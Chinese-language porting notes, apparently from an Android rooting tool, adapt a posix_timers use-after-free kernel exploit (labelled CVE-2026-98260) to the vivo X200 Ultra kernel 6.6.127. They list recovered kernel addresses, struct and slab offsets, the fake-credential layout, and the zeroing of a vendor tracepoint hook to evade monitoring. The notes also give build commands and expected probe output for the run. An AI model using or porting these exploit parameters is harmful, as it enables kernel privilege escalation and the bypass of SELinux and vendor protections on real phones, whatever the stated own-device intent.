# vivo X200 Ultra（PD2454）6.6.127 CVE-2026-98260 适配

与 `K61269_plant.c` / `rust-kplant` 同源、同一物理链路，只有 per-build 常量不同。
新增一个编译期分支 `KERNEL_66127` 和一个独立 `.so`。

这是 **android15-6.6** KMI，不是 6.12 的 android16-6/android16-5；SUSFS 与通用
loader 的现有 6.12 资产不适用于这条链。

## 状态

常量已从 vivo 全量 OTA 的 `boot.img` 内核 Image 静态恢复，并用镜像自带的 `.BTF`
交叉校验了结构布局。真机已验证：2026-11-11 完整链路 SUCCESS（5857ms），
2026-11-12 日志精简版 SUCCESS（7373ms，日志 143 行，无 dmesg 尾巴刷屏）。
该入口随主线的 6.6.127 支持正式发布。

## OTA 来源与提取

- 全量包：`https://sysuptxdl.vivo.com.cn/upgrade/oem/files/20261105033848e16bd87038e4ad12a0f8d867fffbdfe5.zip`
- 包大小：12,620,478,166 字节；`payload.bin` 是 **stored**，不需要下载整包。
- OTA metadata：`vivo/PD2454/PD2454:17/CP2A.260605.016/261104205945:user/release-keys`，
  `post-version=PD2454_A_17.2.11.4.W10.V000L1`，`post-sdk-level=37`，
  `hardware-device=PD2454MA`。
- 只按 HTTP Range 读取 ZIP 尾部/central directory、payload header/manifest 和
  `boot` 的三段数据；boot 操作类型 14 = `REPLACE_ZSTD`，三段合计约 12 MB，
  其余 96 MB 是解压后的 boot 镜像。
- `boot.img`：100,663,296 字节，SHA-256
  `49b7e794253a04d3dbdffd811adde8cfeb017fc820c5b2731422e2502094aa30`
- 内核 Image：36,997,632 字节（`boot.img[0x1000:]`），SHA-256
  `b9210c6bd9703cb60cece82e5c601a429e43d8eaaf668e903a3ba2d009026fc0`
- release：`6.6.127-android15-8-gd489d4ad2a70-abogki567717946-4k`

`payload.bin` 的协议细节：header 为 big-endian；本 OTA 的 partition 操作在
`PartitionUpdate` 的字段 8（vendor 扩展）里，不是标准的字段 2；boot 三段
`data_offset/data_length` 分别为 `1070656/11493075`、`12563731/485484`、
`13049215/1079`，dst_extents 为 `(0,8192)`、`(8192,8192)`、`(16384,8192)`，
block_size 4096；data blob 起点为 `payload_data_start + 24 + 36485 + 267`。

## 复核记录

2026-11-10 用上述内核 Image 复核，`recover.py` 输出与本文件常量一致：

- kallsyms：`n=110398`、`names 0x136ed90..0x14e7a6f`、`offsets 0x14e86c0`、
  `relative_base 0xffffffc080000000`、0 逆序
- `do_timer_create=0xffffffc080197f58`，BL `+0xa4`，site
  `0xffffffc080198000`（low21 `0x198000`）
- `copy_process=0xffffffc0800ac650`，BL `+0x13c`，site
  `0xffffffc0800ac790`（low21 `0xac790`）
- `kmem_cache_alloc=0xffffffc080380920`；
  `kmem_cache_alloc_node=0xffffffc080381290`
- `__tracepoint_sys_exit=0xffffffc0822f3760`；`struct tracepoint` 0x50，
  `funcs` @ 0x48（与 V2505A 相同的 `vr.ko` 处理）
- 静态地址与 BTF 见下节

## 目标

- 机型：vivo X200 Ultra（PD2454），OriginOS 7（Android 17）
- 内核：`6.6.127-android15-8-gd489d4ad2a70-abogki567717946-4k`
- KMI：`android15-6.6`（`ksud late-load --kmi android15-6.6`）
- 与 V2505A 一样，在唤醒 root 子进程前清零 vivo `vr.ko` 使用的
  `__tracepoint_sys_exit->funcs`；6.6.127 对应地址 `0xffffffc0822f3760`，
  `funcs` 偏移 `0x48`。

## 常量

```c
#define TARGET_KERNEL_RELEASE      "6.6.127-android15-8-gd489d4ad2a70-abogki567717946-4k"

/* do_timer_create+0xa8 -> site */
#define STATIC_TIMER_SITE          0xffffffc080198000ULL
#define TIMER_SITE_LOW21           0x198000ULL

/* copy_process+0x140 -> site */
#define COPY_PROCESS_LOW21         0x0ac790ULL

/* kallsyms 链接期地址 */
#define SELINUX_STATE_STATIC       0xffffffc08239a170ULL
#define PANIC_ON_WARN_STATIC       0xffffffc08214ac0cULL
#define SYS_EXIT_TRACEPOINT_STATIC 0xffffffc0822f3760ULL
#define TRACEPOINT_FUNCS_OFF       0x48ULL
#define ROOT_USER_STATIC           0xffffffc08216f108ULL
#define INIT_USER_NS_STATIC        0xffffffc08216ee78ULL
#define INIT_UCOUNTS_STATIC        0xffffffc082170bd8ULL
#define INIT_GROUPS_STATIC         0xffffffc082170668ULL

/* 共享 slab/结构偏移（本 profile 覆盖） */
#define TIMER_REQ                  0x108ULL
#define TIMER_ALLOC                0x140ULL
#define CRED_REQ                   0xb8ULL
#define CRED_ALLOC                 0xc0ULL
#define CRED_UID_OFF               0x8ULL
#define OFF_TASK_CRED              0x820ULL
#define TASK_ALLOC_BYTES           0x12c0ULL
#define TASK_ALLOC_PADDED          0x12c0ULL
```

结构布局（BTF 实测）：

| 对象 | 值 |
| --- | --- |
| `struct k_itimer` | 0x108，`it`（rb node）@ 0x78 |
| `struct cred` | 0xb8；uid/gid @ 0x8，security @ 0x80，user @ 0x88，user_ns @ 0x90，ucounts @ 0x98，group_info @ 0xa0 |
| `struct task_struct` | 0x12c0；`real_cred` @ 0x818，`cred` @ 0x820 |
| `struct selinux_state` | 0x80，`enforcing` @ 0x0 |
| `struct task_security_struct` | 0x18；exec_sid @ 0x8，create_sid @ 0xc |
| `struct tracepoint` | 0x50；`funcs` @ 0x48 |

fake cred 的写入布局（C plant）：`security +0x80`、`user +0x88`、
`user_ns +0x90`、`ucounts +0x98`、`group_info +0xa0`；`uid` 在 `+0x8`。

## 恢复方法（可复现）

```bash
python3 recover.py kernel.bin      # kernel.bin = boot.img[0x1000 : 0x1000+kernel_size]
```

脚本会同时扫描 `kmem_cache_alloc` / `kmem_cache_alloc_node`（6.6 命名）和
`*_noprof`（6.12 命名），并校验 BTF header 后再解析。本镜像没有独立的
`dup_task_struct` 符号，任务分配点在 `copy_process+0x140`；脚本会从
`copy_process` 扫描到 `kmem_cache_alloc_node` 的 BL。

## 构建

```bash
cd exploit/rust-kplant
CARGO_TARGET_DIR=target/k66127 cargo build --release \
    --target aarch64-linux-android --no-default-features --features k66127
cp target/k66127/aarch64-linux-android/release/kplant \
   ../../app/app/src/main/jniLibs/arm64-v8a/libk66127.so
```

`K66127_plant.c` 自行定义 `KERNEL_66127`；`Cargo.toml` 对应 `k66127 = []`，
`build.rs` 的 feature 列表同步加入 `K66127`。`plant_core.inc` 的
`KERNEL_66127` 分支包含 kread、gate 清零、worker fork 与日志采集。

## App 侧

- `ExploitKind.CVE66127("CVE-2026-98260-vivo-6.6.127")`，按完整 `uname -r`
  精确匹配 `6.6.127-android15-8-gd489d4ad2a70-abogki567717946-4k`
- 入口：`nativeLibraryDir/libk66127.so run`
- `PYB110_KMI=android15-6.6`（runner 按 feature 自动设置）；普通模式从已安装
  管理器 APK 取 `ksud`/LKM，管理器必须支持 6.6.127 android15-6.6
- **不启用 SUSFS**（没有 android15-6.6 的 guard KO）；**不启用 Dynamic Switching**
  （现有 universal loader/KO 是 6.18/6.12）；VFS 仅 6.18，不开放
- vivo 上不执行 ColorOS 的卸载内核防护 / 停 riskdetect / 截图栈恢复步骤，
  对应日志只在欧加 ColorOS 入口出现

## 验证顺序

1. 只读自检：`libk66127.so probe` → 期望 `PROBE_KERNEL`、`PROBE_TIMER ... low21=0x198000`、
   `PROBE_TASK ... expected_low21=0xac790`、`PROBE_SLIDE ... aligned=1`、
   `PROBE_LINEAR_MAP`、`PROBE_CRED`、`PROBE_VR_TRACEPOINT=0x... funcs=0x... off=0x48`、
   `PROBE_SCHED_EXIT_TRACEPOINT=0x...`、`PROBE_OK`
2. 完整链路：`libk66127.so run`，关注 `PLANT_CRED_OK` / `PARKED=1` / `MODULE_LOADED`
3. 冷重启后再跑一次；再验证管理器是否正常授权
4. 失败一律留 holder（`t61269-hold`），**同 boot 不要强行重跑**，冷重启再试

## 与 V2505A 的差异

核心链路相同：都是 98260 posix_timers UAF → fake cred → `ksud late-load`；
fake cred 的字段布局也相同。除常量外还有：

- **vr.ko 处理**：V2505A 和 6.6.127 都要在唤醒 root 子进程前清零
  `__tracepoint_sys_exit->funcs`；地址/偏移不同（6.6.127：`0xffffffc0822f3760` /
  `0x48`）。
- **任务分配点**：V2505A 是独立的 `dup_task_struct+0x54`；6.6.127 的
  `dup_task_struct` 已内联进 `copy_process`，site 是 `copy_process+0x140`
  （low21 `0xac790`）。
- **缓存/结构大小**：V2505A 的 k_itimer 0x100、task_struct 0x1440、
  `task->cred` 0x900；6.6.127 是 k_itimer 0x108（alloc 0x140）、task_struct
  0x12c0、`task->cred` 0x820。C 侧为此新增了 `TIMER_REQ` 和
  `TASK_ALLOC_PADDED` 两个 profile 覆盖项。
- **KMI/管理器**：V2505A 是 6.12/android16-5 KMI，已有 SUSFS 与
  Dynamic Switching；6.6.127 是 6.6/android15-8 KMI（`android15-6.6`），
  目前只有普通管理器路径，没有通用 loader 和 SUSFS。
- **App 选择**：6.6.127 隐藏 SUSFS/VFS，不提供 Dynamic Switching；
  V2505A 保留 SUSFS 和 Dynamic Switching。

## 限制

- 只有主链；SUSFS 和通用管理器切换需要另外提供 android15-6.6 的 KO/loader。
- 管理器 APK 必须自带 6.6.127 android15-6.6 的 LKM/ksud；普通模式不使用第三方
  patched KO。
- 竞态 UAF 本身可能导致 panic/重启；仅用于自有设备。
